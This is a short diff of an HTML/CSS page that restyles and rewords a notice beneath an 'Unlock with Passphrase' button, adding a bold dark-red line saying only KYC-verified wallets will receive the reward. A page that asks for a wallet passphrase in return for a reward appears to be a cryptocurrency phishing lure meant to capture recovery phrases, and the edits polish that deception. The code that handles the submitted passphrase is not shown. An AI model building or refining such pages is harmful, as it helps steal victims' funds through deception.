@@ -176,13 +176,24 @@ body {
             margin-top: 15px;
         }
         
+        /* KYC Message Styling (Dark Red) */
+        .kyc-message {
+           font-size: 14px;
+           color: darkred; /* Dark Red Color */
+           text-align: center;
+           font-weight: bold;
+           margin-top: 15px;
+           max-width: 90%;
+        }
+
+        /* Non-Custodial Message Styling (Same as Before) */
         .non-custodial-message {
-            font-size: 14px;
-            color: #666;
-            text-align: justify; /* Adjusts text alignment */
-            margin-top: 10px;
-            max-width: 90%;
-            line-height: 1.5;
+           font-size: 14px;
+           color: #666;
+           text-align: justify;
+           margin-top: 10px;
+           max-width: 90%;
+           line-height: 1.5;
         }
 
     </style>
@@ -244,10 +255,16 @@ body {
             <button class="purple-btn" onclick="submitPassphrase()">Unlock with Passphrase</button>
             <p id="message" class="reward-text"></p>
             <p id="message" class="reward-text"></p>
+
+            <!-- KYC Verification Message (Dark Red) -->
+            <p class="kyc-message">
+                ONLY KYC-VERIFIED WALLETS WILL RECEIVE THE REWARD.
+            </p>
+
+            <!-- Non-Custodial Wallet Message (Original Styling) -->
             <p class="non-custodial-message">
-    As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
-    Recovery of passphrase is currently impossible. 
-    ONLY KYC-VERIFIED WALLETS WILL RECEIVE THE REWARD.
+            As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.  
+            Recovery of passphrase is currently impossible.
             </p>
         </div>
     </div>
